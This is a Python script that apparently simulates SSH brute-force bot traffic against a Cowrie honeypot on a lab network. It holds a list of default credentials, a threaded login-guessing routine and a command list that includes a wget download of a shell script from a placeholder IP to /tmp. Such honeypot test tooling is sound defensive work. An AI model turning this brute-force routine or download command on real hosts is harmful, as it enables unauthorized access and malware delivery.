import random
import socket
import subprocess
import threading
import time
import paramiko

CREDS = [
    ("root", "123456"),
    ("root", "password"),
    ("admin", "admin"),
    ("ubuntu", "ubuntu"),
    ("root", "root"),
    ("test", "test"),
    ("pi", "raspberry")
]

BOT_CMDS = [
    "uname -a",
    "cat /proc/cpuinfo",
    "wget http://198.51.100.250/x.sh -O /tmp/x.sh"
]

def ensure_aliases(n=20):
    for i in range(100, 100 + n):
        try:
            subprocess.run(["ip", "addr", "add", f"172.28.0.{i}/24", "dev", "eth0"], capture_output=True)
        except Exception:
            pass

def one_bot(ip):
    try:
        cow = socket.gethostbyname("cowrie")
        s = socket.socket()
        try:
            s.bind((ip, 0))
        except Exception:
            pass
        s.settimeout(4)
        s.connect((cow, 2222))
        t = paramiko.Transport(s)
        t.start_client(timeout=4)
        for u, p in random.sample(CREDS, random.randint(1, 2)):
            try:
                t.auth_password(u, p)
                break
            except paramiko.AuthenticationException:
                time.sleep(0.1)
        if t.is_authenticated() and random.random() < 0.4:
            ch = t.open_session()
            ch.get_pty()
            ch.invoke_shell()
            for c in BOT_CMDS:
                ch.send(c + "\n")
                time.sleep(0.1)  # Machine-cadence speed
        t.close()
    except Exception:
        pass

def run(waves=3, bots=10):
    print(f"[noise-sim] Launching background noise storm ({waves} waves)...", flush=True)
    ensure_aliases()
    for w in range(waves):
        print(f"[noise-sim] Wave {w+1}/{waves} starting...", flush=True)
        ips = [f"172.28.0.{random.randint(100, 119)}" for _ in range(bots)]
        threads = [threading.Thread(target=one_bot, args=(ip,)) for ip in ips]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        time.sleep(1.5)
    print("[noise-sim] Noise storm completed.", flush=True)

if __name__ == "__main__":
    run()
